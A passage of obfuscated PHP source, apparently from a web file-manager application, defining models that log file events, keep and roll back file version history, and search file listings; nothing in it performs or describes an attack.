$°Ü£ëş°[$´şà•îŠ[240]] > 0) { return; } IO::remove($­’İ‚ù½); self::clearEmptyFolder($––ßãÁ–); } private static function getBasePath() { $æ×¼ˆÛÄ =& $_SERVER[¢ñàß¿€]; $é‡öşÃÌ = Model($æ×¼ˆÛÄ[1330])->get($æ×¼ˆÛÄ[1331]); if ($é‡öşÃÌ) { if (!IO::exist($é‡öşÃÌ)) { IO::mkdir($é‡öşÃÌ); } if (get_path_this($é‡öşÃÌ) == $æ×¼ˆÛÄ[1316]) { $øğ¬Œ« = $æ×¼ˆÛÄ[1332] . rand_string(8); @rename($é‡öşÃÌ, get_path_father($é‡öşÃÌ) . $æ×¼ˆÛÄ[8] . $øğ¬Œ«); $é‡öşÃÌ = DATA_PATH . $øğ¬Œ« . $æ×¼ˆÛÄ[8]; file_put_contents(DATA_PATH . $æ×¼ˆÛÄ[1263], $æ×¼ˆÛÄ[12]); Model($æ×¼ˆÛÄ[1330])->set($æ×¼ˆÛÄ[1331], $é‡öşÃÌ); } return $é‡öşÃÌ; } $é‡öşÃÌ = DATA_PATH . $æ×¼ˆÛÄ[1332] . rand_string(8) . $æ×¼ˆÛÄ[8]; $é‡öşÃÌ = IO::mkdir($é‡öşÃÌ); $é‡öşÃÌ = rtrim($é‡öşÃÌ, $æ×¼ˆÛÄ[8]) . $æ×¼ˆÛÄ[8]; file_put_contents($é‡öşÃÌ . $æ×¼ˆÛÄ[1263], $æ×¼ˆÛÄ[12]); file_put_contents(DATA_PATH . $æ×¼ˆÛÄ[1263], $æ×¼ˆÛÄ[12]); Model($æ×¼ˆÛÄ[1330])->set($æ×¼ˆÛÄ[1331], $é‡öşÃÌ); return $é‡öşÃÌ; } } goto b˜Î¢Ü®„ª; aÄÍ±÷ë¯: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\x72\x63\x65\137\x65\166\x65\156\164"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\124\x69\x6d\145", "\164\151\155\x65", "\x69\156\x73\x65\162\x74", "\x66\x75\156\x63\164\151\x6f\156"), array("\x64\x65\163\x63", '', "\x69\156\x73\145\x72\164\54\165\160\144\141\164\x65\x2c\163\x65\x6c\x65\143\x74", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ÒªÀ»í´, $®ñÔÁÂğ, $ÈòğĞÄş = '') { $ Ú¤„½å =& $_SERVER[¢ñàß¿€]; if (!$this->eventSave) { return; } $æûšÏ¹ = Model($ Ú¤„½å[1414])->sourceInfo($ÒªÀ»í´); if (!$æûšÏ¹) { return !1; } if ($this->isDisableEvent($æûšÏ¹, $®ñÔÁÂğ)) { return; } if ($ÈòğĞÄş && is_string($ÈòğĞÄş)) { $ÈòğĞÄş = array($ Ú¤„½å[2007] => $ÈòğĞÄş); } $º†÷ÕƒÚ = defined($ Ú¤„½å[2194]) ? USER_ID : 0; $¶œ«µ¿ = array($ Ú¤„½å[491] => $ÒªÀ»í´, $ Ú¤„½å[2195] => $æûšÏ¹[$ Ú¤„½å[192]], $ Ú¤„½å[2196] => $æûšÏ¹[$ Ú¤„½å[32]], $ Ú¤„½å[582] => !empty($æûšÏ¹[$ Ú¤„½å[582]]) ? $æûšÏ¹[$ Ú¤„½å[582]] : $ Ú¤„½å[12], $ Ú¤„½å[1761] => $º†÷ÕƒÚ, $ Ú¤„½å[496] => $®ñÔÁÂğ, $ Ú¤„½å[1763] => $ÈòğĞÄş); $this->addSystemLog($®ñÔÁÂğ, $¶œ«µ¿); unset($¶œ«µ¿[$ Ú¤„½å[2196]], $¶œ«µ¿[$ Ú¤„½å[582]]); return $this->add($¶œ«µ¿); } private function addSystemLog($Œ‡¼ÉŒ, $€¯ö¿©¶) { $¨ø‡›ì =& $_SERVER[¢ñàß¿€]; if ($Œ‡¼ÉŒ == $¨ø‡›ì[2197]) { $Œ‡¼ÉŒ = $€¯ö¿©¶[$¨ø‡›ì[526]][$¨ø‡›ì[2198]]; } else { if (in_array($Œ‡¼ÉŒ, array($¨ø‡›ì[1948], $¨ø‡›ì[2199]))) { $Œ‡¼ÉŒ = $€¯ö¿©¶[$¨ø‡›ì[526]][$¨ø‡›ì[171]]; } } $ßŒŸˆ¬š = array_merge($€¯ö¿©¶, array($¨ø‡›ì[2200] => $€¯ö¿©¶[$¨ø‡›ì[193]], $¨ø‡›ì[2201] => $€¯ö¿©¶[$¨ø‡›ì[2201]])); Hook::trigger($¨ø‡›ì[2202], $¨ø‡›ì[2203] . $Œ‡¼ÉŒ, $€¯ö¿©¶); Model($¨ø‡›ì[1912])->addLog($¨ø‡›ì[2203] . $Œ‡¼ÉŒ, $ßŒŸˆ¬š); } private function isDisableEvent($œİ‰Öğ«, $íöééº) { $ŞŒñê½ =& $_SERVER[¢ñàß¿€]; if ($œİ‰Öğ«[$ŞŒñê½[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($íöééº == $ŞŒñê½[1937]) { return !1; } return !0; } public function eventCreate($¯‰‚æÁ¬, $°·ıºşñ) { $Õ·€ã¶è =& $_SERVER[¢ñàß¿€]; $ÕÈĞ¿‹‚ = Model($Õ·€ã¶è[1414])->sourceInfo($¯‰‚æÁ¬); $«±±•ıœ = array($Õ·€ã¶è[2198] => $°·ıºşñ, $Õ·€ã¶è[32] => $ÕÈĞ¿‹‚[$Õ·€ã¶è[32]]); return $this->addEvent($¯‰‚æÁ¬, $Õ·€ã¶è[2197], $«±±•ıœ); } public function eventFileEdit($ÚşÓêµ¿) { $Ë¯ÍİÜ =& $_SERVER[¢ñàß¿€]; $•œè›®– = array($Ë¯ÍİÜ[2204] => $_SERVER[$Ë¯ÍİÜ[2205]], $Ë¯ÍİÜ[2206] => strtolower(ACTION)); if (isset($GLOBALS[$Ë¯ÍİÜ[7]][$Ë¯ÍİÜ[2207]])) { $•œè›®–[$Ë¯ÍİÜ[2207]] = $Ë¯ÍİÜ[91]; } return $this->addEvent($ÚşÓêµ¿, $Ë¯ÍİÜ[1938], $•œè›®–); } public function eventRecycle($«‰¯­ßÕ, $’˜ÕÛœ¸) { return $this->addEvent($«‰¯­ßÕ, $_SERVER[¢ñàß¿€][2199], $’˜ÕÛœ¸); } private static $_removeLast = ''; public function eventRemove($ªŞ•¢›†) { $Í±œ¹‰ô =& $_SERVER[¢ñàß¿€]; self::$_removeLast = $ªŞ•¢›†; $ÕÂïéÄÕ = Model($Í±œ¹‰ô[1414])->sourceInfo($ªŞ•¢›†); $ĞƒÖ‡µç = array_field_key($ÕÂïéÄÕ, array($Í±œ¹‰ô[193], $Í±œ¹‰ô[541], $Í±œ¹‰ô[505], $Í±œ¹‰ô[584])); $¹—»¾ÙŠ = array($Í±œ¹‰ô[171] => $ÕÂïéÄÕ[$Í±œ¹‰ô[32]], $Í±œ¹‰ô[2206] => ACTION, $Í±œ¹‰ô[2208] => $ĞƒÖ‡µç); return $this->addEvent($ÕÂïéÄÕ[$Í±œ¹‰ô[192]], $Í±œ¹‰ô[1937], $¹—»¾ÙŠ); } public function eventShare($°µ¶Ÿ „, $‘ƒËïÌ…) { return $this->addEvent($°µ¶Ÿ „, $_SERVER[¢ñàß¿€][1948], $‘ƒËïÌ…); } public function eventMove($Íø¸ì›¥, $ìªÖª, $Ë©¾²÷ª) { $û‚ÁœÚÔ =& $_SERVER[¢ñàß¿€]; if (self::$_removeLast == $Íø¸ì›¥) { return; } $ğ¾ßŸ…à = Model($û‚ÁœÚÔ[1414]); $ÈÙ–Ü±õ = $ğ¾ßŸ…à->sourceInfo($Íø¸ì›¥); $¿Ë¼Œôİ = $ğ¾ßŸ…à->sourceInfo($ìªÖª); $ô³Õ¸÷Ş = $ğ¾ßŸ…à->sourceInfo($Ë©¾²÷ª); $åì……ŸÍ = array($û‚ÁœÚÔ[1238] => $ìªÖª, $û‚ÁœÚÔ[2209] => $¿Ë¼Œôİ[$û‚ÁœÚÔ[32]], $û‚ÁœÚÔ[2185] => !empty($¿Ë¼Œôİ[$û‚ÁœÚÔ[582]]) ? $¿Ë¼Œôİ[$û‚ÁœÚÔ[582]] : $û‚ÁœÚÔ[12], $û‚ÁœÚÔ[1239] => $Ë©¾²÷ª, $û‚ÁœÚÔ[2210] => $ô³Õ¸÷Ş[$û‚ÁœÚÔ[32]], $û‚ÁœÚÔ[2211] => !empty($ô³Õ¸÷Ş[$û‚ÁœÚÔ[582]]) ? $ô³Õ¸÷Ş[$û‚ÁœÚÔ[582]] : $û‚ÁœÚÔ[12]); $this->addEvent($Íø¸ì›¥, $û‚ÁœÚÔ[620], $åì……ŸÍ); $ÈÙ–Ü±õ = $ğ¾ßŸ…à->sourceInfo($Íø¸ì›¥); $åì……ŸÍ = array($û‚ÁœÚÔ[193] => $ÈÙ–Ü±õ[$û‚ÁœÚÔ[193]], $û‚ÁœÚÔ[32] => $ÈÙ–Ü±õ[$û‚ÁœÚÔ[32]]); $this->addEvent($ìªÖª, $û‚ÁœÚÔ[2212], $åì……ŸÍ); } public function eventCopy($ñ“ËãÉ) { $this->eventCreate($ñ“ËãÉ, $_SERVER[¢ñàß¿€][618]); } public function eventRename($«”ÌØï¨, $š½»»É„, $ãå•Á”Ï) { $Î‚îĞˆ =& $_SERVER[¢ñàß¿€]; $î»Ñ¦§à = array($Î‚îĞˆ[1238] => $š½»»É„, $Î‚îĞˆ[1239] => $ãå•Á”Ï); return $this->addEvent($«”ÌØï¨, $Î‚îĞˆ[1428], $î»Ñ¦§à); } public function eventAddComment($«‰å­òè, $³˜ıñ¸) { return $this->addEvent($«‰å­òè, $_SERVER[¢ñàß¿€][2213], $³˜ıñ¸); } public function eventAddDesc($ƒ›öã¼•, $ş¤ßÃ¤Ù) { return $this->addEvent($ƒ›öã¼•, $_SERVER[¢ñàß¿€][2214], $ş¤ßÃ¤Ù); } public function listBySource($ÀßòñÎÚ) { $ßµş¿ =& $_SERVER[¢ñàß¿€]; $ïŸ¶Ôà = Model($ßµş¿[1414])->sourceInfo($ÀßòñÎÚ); $ê£×Åâ¥ = array($ßµş¿[491] => $ÀßòñÎÚ); if ($ïŸ¶Ôà[$ßµş¿[485]] == $ßµş¿[91]) { $¸ã¨ıä¥ = Model($ßµş¿[1414])->listSearchChildren($ÀßòñÎÚ, 20000); $¸ã¨ıä¥[] = $ÀßòñÎÚ . $ßµş¿[454]; $ê£×Åâ¥ = array($ßµş¿[193] => array($ßµş¿[7], $¸ã¨ıä¥)); } $Œ×÷¨¾ğ = $this->where($ê£×Åâ¥)->order($ßµş¿[2215])->selectPage(); if ($Œ×÷¨¾ğ[$ßµş¿[442]][$ßµş¿[443]] == 0) { $Œ×÷¨¾ğ[$ßµş¿[442]][$ßµş¿[443]] = 1; $Œ×÷¨¾ğ[$ßµş¿[445]] = array(array($ßµş¿[491] => $ÀßòñÎÚ, $ßµş¿[2195] => $ïŸ¶Ôà[$ßµş¿[192]], $ßµş¿[1761] => $ïŸ¶Ôà[$ßµş¿[527]], $ßµş¿[496] => $ßµş¿[2216], $ßµş¿[497] => $ïŸ¶Ôà[$ßµş¿[231]], $ßµş¿[1763] => $ßµş¿[12])); } return $this->eventListParse($Œ×÷¨¾ğ, $ÀßòñÎÚ); } private function eventListParse($Ö•å‰Šä, $¶³¦˜”) { $‘úùà‘ =& $_SERVER[¢ñàß¿€]; $÷ÎÇî¥‚ = $Ö•å‰Šä[$‘úùà‘[445]]; $…¼ª®š = array_to_keyvalue($÷ÎÇî¥‚, $‘úùà‘[12], $‘úùà‘[193]); $¥½¾ÈÀ¿ = array_to_keyvalue($÷ÎÇî¥‚, $‘úùà‘[12], $‘úùà‘[2201]); foreach ($÷ÎÇî¥‚ as $‘ößí’œ) { $ôŞ×è‹˜ = $‘ößí’œ[$‘úùà‘[526]]; if ($‘ößí’œ[$‘úùà‘[33]] == $‘úùà‘[620] && isset($ôŞ×è‹˜[$‘úùà‘[1238]])) { $…¼ª®š[] = $ôŞ×è‹˜[$‘úùà‘[1238]] . $‘úùà‘[12]; $…¼ª®š[] = $ôŞ×è‹˜[$‘úùà‘[1239]] . $‘úùà‘[12]; } if ($‘ößí’œ[$‘úùà‘[33]] == $‘úùà‘[2212] && isset($ôŞ×è‹˜[$‘úùà‘[193]])) { $…¼ª®š[] = $ôŞ×è‹˜[$‘úùà‘[193]] . $‘úùà‘[12]; } } $…¼ª®š = array_merge($…¼ª®š, $¥½¾ÈÀ¿, array($¶³¦˜” . $‘úùà‘[12])); $…¼ª®š = array_unique($…¼ª®š); $ÃÀØîğğ = array_unique(array_to_keyvalue($÷ÎÇî¥‚, $‘úùà‘[12], $‘úùà‘[1770])); $×©î¤œ• = Model($‘úùà‘[598])->userListInfo($ÃÀØîğğ); $àı¿úùù = Model($‘úùà‘[895])->sourceListInfo($…¼ª®š, !0); foreach ($÷ÎÇî¥‚ as &$‘ößí’œ) { if ($‘ößí’œ[$‘úùà‘[33]] == $‘úùà‘[620] && isset($‘ößí’œ[$‘úùà‘[526]][$‘úùà‘[1238]])) { $‘ößí’œ[$‘úùà‘[526]][$‘úùà‘[1238]] = $àı¿úùù[$‘ößí’œ[$‘úùà‘[526]][$‘úùà‘[1238]]]; $‘ößí’œ[$‘úùà‘[526]][$‘úùà‘[1239]] = $àı¿úùù[$‘ößí’œ[$‘úùà‘[526]][$‘úùà‘[1239]]]; } if ($‘ößí’œ[$‘úùà‘[33]] == $‘úùà‘[2212] && isset($‘ößí’œ[$‘úùà‘[526]][$‘úùà‘[193]])) { $‘ößí’œ[$‘úùà‘[526]][$‘úùà‘[193]] = $àı¿úùù[$‘ößí’œ[$‘úùà‘[526]][$‘úùà‘[193]]]; } $‘ößí’œ[$‘úùà‘[90]] = $àı¿úùù[$‘ößí’œ[$‘úùà‘[193]]]; $‘ößí’œ[$‘úùà‘[2217]] = $àı¿úùù[$‘ößí’œ[$‘úùà‘[2201]]]; if ($‘ößí’œ[$‘úùà‘[33]] == $‘úùà‘[1937]) { $‘ößí’œ[$‘úùà‘[2217]] = $‘ößí’œ[$‘úùà‘[90]]; $‘ößí’œ[$‘úùà‘[2201]] = $‘ößí’œ[$‘úùà‘[2217]][$‘úùà‘[193]]; $‘ößí’œ[$‘úùà‘[90]] = !1; $‘ößí’œ[$‘úùà‘[193]] = $‘úùà‘[12]; } $‘ößí’œ[$‘úùà‘[2144]] = $×©î¤œ•[$‘ößí’œ[$‘úùà‘[1770]]]; } unset($‘ößí’œ); $Ö•å‰Šä[$‘úùà‘[445]] = $÷ÎÇî¥‚; return $Ö•å‰Šä; } public function removeBySource($»ô…Ïâş) { $ó³‡†õ = array($_SERVER[¢ñàß¿€][491] => $»ô…Ïâş); $this->where($ó³‡†õ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\143\x65\x5f\x68\151\x73\x74\x6f\x72\171"; public function historyCount($œöÅ¢¥õ) { $É¼Û¤³á =& $_SERVER[¢ñàß¿€]; if (!$œöÅ¢¥õ) { return array(); } if (is_string($œöÅ¢¥õ) || is_int($œöÅ¢¥õ)) { $œöÅ¢¥õ = array($œöÅ¢¥õ); } $ğö“‘Ä» = array($É¼Û¤³á[193], $É¼Û¤³á[2001] => $É¼Û¤³á[565]); $ç‘´Ù¸¬ = array($É¼Û¤³á[193] => array($É¼Û¤³á[7], $œöÅ¢¥õ)); $ÆÏŒŞ‘Ë = $this->field($ğö“‘Ä»)->where($ç‘´Ù¸¬)->group($É¼Û¤³á[193])->select(); return array_to_keyvalue($ÆÏŒŞ‘Ë, $É¼Û¤³á[193], $É¼Û¤³á[565]); } public function addHistory($©õæ¨¿ë, $È“¾ìßÜ = '') { $öàÁø†¤ =& $_SERVER[¢ñàß¿€]; $—Şûª±Õ = array($öàÁø†¤[491] => $©õæ¨¿ë[$öàÁø†¤[193]], $öàÁø†¤[1761] => isset($©õæ¨¿ë[$öàÁø†¤[529]]) ? $©õæ¨¿ë[$öàÁø†¤[529]] : $©õæ¨¿ë[$öàÁø†¤[527]], $öàÁø†¤[542] => $©õæ¨¿ë[$öàÁø†¤[541]], $öàÁø†¤[617] => $©õæ¨¿ë[$öàÁø†¤[79]], $öàÁø†¤[2218] => $È“¾ìßÜ); if ($GLOBALS[$öàÁø†¤[6]][$öàÁø†¤[92]][$öàÁø†¤[1299]] >= 1) { $this->historyAutoClear($—Şûª±Õ[$öàÁø†¤[193]]); $this->add($—Şûª±Õ); } Hook::trigger($öàÁø†¤[2219], $—Şûª±Õ); Model($öàÁø†¤[2220])->eventFileEdit($©õæ¨¿ë[$öàÁø†¤[193]]); } private function historyAutoClear($“åã‚Ç) { $‘éÅû§ô =& $_SERVER[¢ñàß¿€]; $©ÅËŸ›  = Model($‘éÅû§ô[841])->get($‘éÅû§ô[1321]); $ÀŠïÔ‚ = intval($GLOBALS[$‘éÅû§ô[6]][$‘éÅû§ô[92]][$‘éÅû§ô[1299]]); $–°¼Æ¸ = $©ÅËŸ›  == $‘éÅû§ô[1322] ? min(5, $ÀŠïÔ‚) : $ÀŠïÔ‚; $–°¼Æ¸ = $–°¼Æ¸ <= 0 ? 0 : $–°¼Æ¸ - 1; if ($–°¼Æ¸ >= 499) { return; } $Ï…š‚Ê = array($‘éÅû§ô[491] => $“åã‚Ç); $šıÛÈ½ = $this->field($‘éÅû§ô[2221])->where($Ï…š‚Ê)->order($‘éÅû§ô[2215])->select(); if (!$šıÛÈ½ || $–°¼Æ¸ >= count($šıÛÈ½)) { return; } $é¹ı’«ü = array_to_keyvalue($šıÛÈ½, $‘éÅû§ô[12], $‘éÅû§ô[475]); $é¹ı’«ü = array_slice($é¹ı’«ü, $–°¼Æ¸); $İ „ïÃ = array_to_keyvalue($šıÛÈ½, $‘éÅû§ô[12], $‘éÅû§ô[541]); $İ „ïÃ = array_slice($İ „ïÃ, $–°¼Æ¸); if (!$é¹ı’«ü || !$İ „ïÃ) { return; } $Ï…š‚Ê = array($‘éÅû§ô[493] => array($‘éÅû§ô[7], $é¹ı’«ü)); $this->where($Ï…š‚Ê)->delete(); Model($‘éÅû§ô[544])->remove($İ „ïÃ); } public function listData($ˆÍ¾¨¤É) { $¿Ô¯¬çß =& $_SERVER[¢ñàß¿€]; $ç¶ÄŒ‡Ö = array($¿Ô¯¬çß[491] => $ˆÍ¾¨¤É); $ÚƒÇÉö = $¿Ô¯¬çß[2222]; $šÅğ¤÷ = $this->field($ÚƒÇÉö)->where($ç¶ÄŒ‡Ö)->order($¿Ô¯¬çß[2215])->selectPage(); $this->_listAppendUser($šÅğ¤÷[$¿Ô¯¬çß[445]]); $ûŒĞ‘Œ© = Model($¿Ô¯¬çß[841])->get($¿Ô¯¬çß[1321]); $”Ñù¥‚Î = 5; if ($ûŒĞ‘Œ© == $¿Ô¯¬çß[1322]) { $šÅğ¤÷[$¿Ô¯¬çß[445]] = array_slice($šÅğ¤÷[$¿Ô¯¬çß[445]], 0, $”Ñù¥‚Î); $šÅğ¤÷[$¿Ô¯¬çß[442]] = array($¿Ô¯¬çß[2223] => 1, $¿Ô¯¬çß[2224] => 20, $¿Ô¯¬çß[2225] => 1, $¿Ô¯¬çß[2226] => count($šÅğ¤÷[$¿Ô¯¬çß[445]])); } return $šÅğ¤÷; } protected function _listAppendUser(&$Àå¦™¿ê) { $Ä„½„ å =& $_SERVER[¢ñàß¿€]; $šÊÈ Íæ = array_to_keyvalue($Àå¦™¿ê, $Ä„½„ å[12], $Ä„½„ å[1770]); $Ÿ†Åªœê = Model($Ä„½„ å[598])->userListInfo($šÊÈ Íæ); foreach ($Àå¦™¿ê as &$õıàÌ”¿) { $¾è†‰ô’ = $õıàÌ”¿[$Ä„½„ å[1770]]; $õıàÌ”¿[$Ä„½„ å[527]] = $Ÿ†Åªœê[$¾è†‰ô’] ? $Ÿ†Åªœê[$¾è†‰ô’] : !1; } unset($õıàÌ”¿); } public function fileInfo($Ä–æ†Íó) { $š‚Åƒ§Œ =& $_SERVER[¢ñàß¿€]; $´»Ô©†º = $this->tablePrefix; $ëí–üëï = "{$´»Ô©†º}\151\157\137\146\x69\x6c\x65\x20\x66\x69\x6c\145\x73\x20\x6f\x6e\40\x66\151\x6c\x65\163\x2e\146\x69\154\x65\111\x44\40\75\40\150\x69\163\164\157\162\x79\56\x66\x69\154\x65\111\104"; return $this->alias($š‚Åƒ§Œ[2227])->where(array($š‚Åƒ§Œ[493] => $Ä–æ†Íó))->join($ëí–üëï, $š‚Åƒ§Œ[2228])->find(); } public function removeItem($œİ—Ÿ½”) { $ú„ÙÆëÙ =& $_SERVER[¢ñàß¿€]; $ï‹å¿‡ = array($ú„ÙÆëÙ[493] => $œİ—Ÿ½”); $Ø¦Æ¶éÀ = $this->where($ï‹å¿‡)->find(); if ($Ø¦Æ¶éÀ) { $Ùš‚’„á = $this->where($ï‹å¿‡)->delete(); Model($ú„ÙÆëÙ[544])->remove($Ø¦Æ¶éÀ[$ú„ÙÆëÙ[541]]); return $Ùš‚’„á; } return !1; } public function removeBySource($Äà«¨í¼) { $ıÄ§ÉË =& $_SERVER[¢ñàß¿€]; if (!$Äà«¨í¼) { return !1; } if (!is_array($Äà«¨í¼)) { $Äà«¨í¼ = array($Äà«¨í¼); } $èÖïš²¿ = array($ıÄ§ÉË[491] => array($ıÄ§ÉË[7], $Äà«¨í¼)); $Ê±ıÃ÷– = $this->field($ıÄ§ÉË[542])->where($èÖïš²¿)->select(); if ($Ê±ıÃ÷–) { $this->where($èÖïš²¿)->delete(); $º–ï”…Æ = array_to_keyvalue($Ê±ıÃ÷–, $ıÄ§ÉË[12], $ıÄ§ÉË[541]); Model($ıÄ§ÉË[544])->remove($º–ï”…Æ); } return !0; } public function setDetail($É³¿–Ÿ”, $ÈÚéõ…·) { $üàòÖ§Ø =& $_SERVER[¢ñàß¿€]; return $this->where(array($üàòÖ§Ø[493] => $É³¿–Ÿ”))->save(array($üàòÖ§Ø[2218] => $ÈÚéõ…·)); } public function rollbackToItem($õğ—óŞ“, $Ø­’Ş±) { $Œ²”«Ï‚ =& $_SERVER[¢ñàß¿€]; $†Ê¦Ùâ² = Model($Œ²”«Ï‚[895])->sourceInfo($õğ—óŞ“); $this->addHistory($†Ê¦Ùâ², LNG($Œ²”«Ï‚[2229])); $©£„¬·¤ = $this->find($Ø­’Ş±); $û÷Ø »› = array($Œ²”«Ï‚[541] => $©£„¬·¤[$Œ²”«Ï‚[541]], $Œ²”«Ï‚[79] => $©£„¬·¤[$Œ²”«Ï‚[79]], $Œ²”«Ï‚[88] => time(), $Œ²”«Ï‚[529] => USER_ID); Model($Œ²”«Ï‚[895])->where(array($Œ²”«Ï‚[193] => $õğ—óŞ“))->save($û÷Ø »›); return $this->where(array($Œ²”«Ï‚[493] => $Ø­’Ş±))->delete(); } public function clearSame($ŸÍéŒ÷Ä) { $á—ÒÈ§” =& $_SERVER[¢ñàß¿€]; $Õ½€—Ò… = $this->listData($ŸÍéŒ÷Ä); $î«¤­± = array_to_keyvalue_group($Õ½€—Ò…, $á—ÒÈ§”[541]); $ºÇá»Æã = array(); $‹·‡ÔÃ– = array(); foreach ($î«¤­± as $áíæÓ‚) { if (!$áíæÓ‚ || count($áíæÓ‚) <= 1) { continue; } foreach ($áíæÓ‚ as $Ø«à¥ÂĞ) { $ºÇá»Æã[] = $Ø«à¥ÂĞ[$á—ÒÈ§”[541]]; $‹·‡ÔÃ–[] = $Ø«à¥ÂĞ[$á—ÒÈ§”[475]]; } } if (!$‹·‡ÔÃ–) { return; } $this->where(array($á—ÒÈ§”[475] => array($á—ÒÈ§”[7], $‹·‡ÔÃ–)))->delete(); Model($á—ÒÈ§”[544])->remove($ºÇá»Æã); } public function userSpace() { $‰×±ğÔä =& $_SERVER[¢ñàß¿€]; $×ŠÃÚÉµ = $this->tablePrefix; $Ï‡ˆºÉ = array($‰×±ğÔä[1761] => USER_ID); $íÅ‰í³¨ = "{$×ŠÃÚÉµ}\151\x6f\137\146\x69\154\x65\x20\x66\151\x6c\145\163\x20\x6f\x6e\40\146\151\154\145\163\x2e\146\151\154\x65\111\104\x20\75\x20\x68\x69\x73\x74\x6f\162\171\56\146\x69\154\x65\111\104"; return $this->alias($‰×±ğÔä[2227])->where($Ï‡ˆºÉ)->join($íÅ‰í³¨, $‰×±ğÔä[2228])->sum($‰×±ğÔä[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÄµÃ‘°) { $ò¡‚Õà÷ =& $_SERVER[¢ñàß¿€]; $ÙşÒø¶× = KodIO::fileTypeList(); $¢üÅé˜ = $ÙşÒø¶×[$ÄµÃ‘°]; if (!$¢üÅé˜) { return array(); } $úÛÄš¨Õ = $¢üÅé˜[$ò¡‚Õà÷[169]]; $ÒÔˆùÔº = $ò¡‚Õà÷[7]; if (!$¢üÅé˜[$ò¡‚Õà÷[169]]) { $ßğ¨İÍ = array_to_keyvalue($ÙşÒø¶×, $ò¡‚Õà÷[12], $ò¡‚Õà÷[169]); $úÛÄš¨Õ = implode($ò¡‚Õà÷[50], $ßğ¨İÍ); $ÒÔˆùÔº = $ò¡‚Õà÷[2230]; } $œ€Í§ = explode($ò¡‚Õà÷[50], trim($úÛÄš¨Õ, $ò¡‚Õà÷[50])); return array($ÒÔˆùÔº, $œ€Í§); } public function listPathType($–Ûå­—Œ) { $™´ŠŞÓŒ =& $_SERVER[¢ñàß¿€]; $×Á¯„ = $this->fileTypeWhere($–Ûå­—Œ); if (!$×Á¯„) { return array(); } $®¼›„å… = USER_ID; $ï»ú¡·µ = Model($™´ŠŞÓŒ[598])->getInfo($®¼›„å…); $ó°„õ£· = array($™´ŠŞÓŒ[648] => SourceModel::TYPE_USER, $™´ŠŞÓŒ[584] => array($™´ŠŞÓŒ[612], $™´ŠŞÓŒ[594] . $ï»ú¡·µ[$™´ŠŞÓŒ[90]][$™´ŠŞÓŒ[193]] . $™´ŠŞÓŒ[613]), $™´ŠŞÓŒ[649] => $®¼›„å…, $™´ŠŞÓŒ[646] => 0, $™´ŠŞÓŒ[647] => $×Á¯„); return $this->listSource($ó°„õ£·); } public function listSearch($ªó†°Áé, $ìÌ®ú± = 300) { $ëš¼›ÁÅ =& $_SERVER[¢ñàß¿€]; if (isset($ªó†°Áé[$ëš¼›ÁÅ[2066]]) && $ªó†°Áé[$ëš¼›ÁÅ[2066]]) { $ªó†°Áé[$ëš¼›ÁÅ[2066]] = str_replace($ëš¼›ÁÅ[460], $ëš¼›ÁÅ[2231], trim($ªó†°Áé[$ëš¼›ÁÅ[2066]])); } $¢àë¨¥Ë = $this->_parseSearchWhere($ªó†°Áé); if (!isset($¢àë¨¥Ë[$ëš¼›ÁÅ[505]])) { $¢àë¨¥Ë[$ëš¼›ÁÅ[505]] = 0; } $Ÿ ò©À = $ëš¼›ÁÅ[2232]; $ÏÅÒ¼°¹ = $¢àë¨¥Ë; $Êø„“è² = $Ÿ ò©À; $this->_listSearchBindPinyin($ªó†°Áé, $¢àë¨¥Ë, $Ÿ ò©À); $this->alias($ëš¼›ÁÅ[519])->_makeOrder(); $¢àë¨¥Ë = $this->parseWhereLike($¢àë¨¥Ë); $ø›Ôíƒæ = $this->distinct(!0)->field($Ÿ ò©À)->where($¢àë¨¥Ë)->selectPage($ìÌ®ú±); if ($GLOBALS[$ëš¼›ÁÅ[6]][$ëš¼›ÁÅ[457]][$ëš¼›ÁÅ[458]] && Input::check($ªó†°Áé[$ëš¼›ÁÅ[2066]], $ëš¼›ÁÅ[655]) && $ø›Ôíƒæ[$ëš¼›ÁÅ[442]][$ëš¼›ÁÅ[429]] == 1 && $ø›Ôíƒæ[$ëš¼›ÁÅ[442]][$ëš¼›ÁÅ[443]] == 0) { $ø›Ôíƒæ = $this->distinct(!0)->field($Ÿ ò©À)->where($ÏÅÒ¼°¹)->limit(1000)->select(); $ø›Ôíƒæ = array_page_split($ø›Ôíƒæ, !1, $ìÌ®ú±); } $this->_listSearchFileContent($ø›Ôíƒæ, $ªó†°Áé, $Êø„“è², $ÏÅÒ¼°¹); $this->_listSearchDesc($ø›Ôíƒæ, $ªó†°Áé, $Êø„“è²); $this->_listSearchTag($ø›Ôíƒæ, $ªó†°Áé, $Êø„“è²); $this->_listSearchGroupTag($ø›Ôíƒæ, $ªó†°Áé, $Êø„“è²); $this->_listDataApply($ø›Ôíƒæ[$ëš¼›ÁÅ[445]]); $this->_listMake($ø›Ôíƒæ); return $ø›Ôíƒæ; } private function _listSearchFileContent(&$ É¡¬•£, $„Æ•òÕ¹, $±°ÄŞÏ™, $± ¨µ¬£) { $æ©©±€ =& $_SERVER[¢ñàß¿€]; if (!$„Æ•òÕ¹[$æ©©±€[2066]] || $ É¡¬•£[$æ©©±€[442]][$æ©©±€[429]] > 1) { return; } if (!isset($± ¨µ¬£[$æ©©±€[32]]) || !is_array($„Æ•òÕ¹[$æ©©±€[541]])) { return; } $± ¨µ¬£[$æ©©±€[541]] = array($æ©©±€[7], $„Æ•òÕ¹[$æ©©±€[541]]); unset($± ¨µ¬£[$æ©©±€[32]]); unset($„Æ•òÕ¹[$æ©©±€[541]]); $£ şû‡ = $this->field($±°ÄŞÏ™)->where($± ¨µ¬£)->limit($æ©©±€[2233])->select(); if (!$£ şû‡ || count($£ şû‡) == 0) { return; } $ É¡¬•£[$æ©©±€[445]] = array_merge($£ şû‡, $ É¡¬•£[$æ©©±€[445]]); $ É¡¬•£[$æ©©±€[442]][$æ©©±€[443]] += count($£ şû‡); } private function _listSearchTag(&$Ğş Ó¸í, $ŞàıàêŞ, $À¨Ôı†) { $‘é˜ì˜– =& $_SERVER[¢ñàß¿€]; if (!$ŞàıàêŞ[$‘é˜ì˜–[2066]] || $Ğş Ó¸í[$‘é˜ì˜–[442]][$‘é˜ì˜–[429]] > 1) { return; 